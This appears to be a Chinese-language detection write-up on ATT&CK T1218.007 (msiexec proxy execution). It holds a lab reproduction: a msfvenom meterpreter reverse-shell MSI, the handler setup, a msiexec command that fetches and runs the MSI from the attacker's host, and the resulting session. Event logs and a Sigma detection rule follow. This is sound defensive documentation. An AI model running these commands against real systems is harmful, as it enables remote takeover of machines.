# T1218-007-win-基于白名单Msiexec执行Payload

## 来自ATT&CK的描述

可信数字证书签署的二进制文件在Windows操作系统执行时，可通过数字签名验证保护。Windows安装过程中默认安装的一些微软签名的二进制文件可用来代理执行其它文件。攻击者可能会滥用此技术来执行可能绕过应用白名单机制和系统签名验证的恶意文件。该技术考虑了现有技术中尚未考虑的代理执行方法。

## 测试案例

Msiexec是Windows Installer的一部分。用于安装Windows Installer安装包（MSI）,一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于Windows 2003，Windows 7等。

说明：Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。Ftp.exe是Windows本身自带的一个程序，属于微软FTP工具，提供基本的FTP访问。

说明：Ftp.exe所在路径已被系统添加PATH环境变量中，因此，Ftp.exe命令可识别。

· msiexec.exe /q /i"C:\path\to\file.msi"

· msiexec.exe /q /i http[:]//site[.]com/file.msi

· msiexec.exe /y "C:\path\to\file.dll"

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows 7

### 攻击分析

#### 生成payload.dll

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f msi > 1.msi
```

#### 执行监听

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 1234
lport => 1234
msf5 exploit(multi/handler) >expliot
```

#### 靶机执行payload

```cmd
msiexec /q /i http://192.168.126.146/1.msi
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:1234
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49323) at 2020-04-18 22:04:26 +0800

meterpreter > getuid
Server username: 12306Br0-PC\12306Br0
```

## 测试留痕

```log
# windows安全日志
事件ID： 4688
进程信息:
新进程 ID: 0xe78
新进程名: C:\Windows\System32\msiexec.exe

# sysmon日志
事件ID：1
UtcTime: 2020-04-18 14:04:16.596
ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}
ProcessId: 3704
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows® installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: msiexec  /q /i http://192.168.126.146/1.msi
CurrentDirectory: C:\Users\12306Br0\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}
ParentProcessId: 1900
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe"
```

## 检测规则/思路

### sigma规则

```yml
title: MsiExec Web Install
status: experimental
description: Detects suspicious msiexec process starts with web addreses as parameter
references:
    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/
tags:
    - attack.defense_evasion
author: Florian Roth
date: 2018/02/09
modified: 2012/12/11
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine:
            - '* msiexec*://*'
    condition: selection
falsepositives:
    - False positives depend on scripts and administrative tools used in the monitored environment
level: medium
```

### 建议

可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1218-007

<https://attack.mitre.org/techniques/T1218/007/>

基于白名单的Payload

<https://blog.csdn.net/weixin_30790841/article/details/101848854>
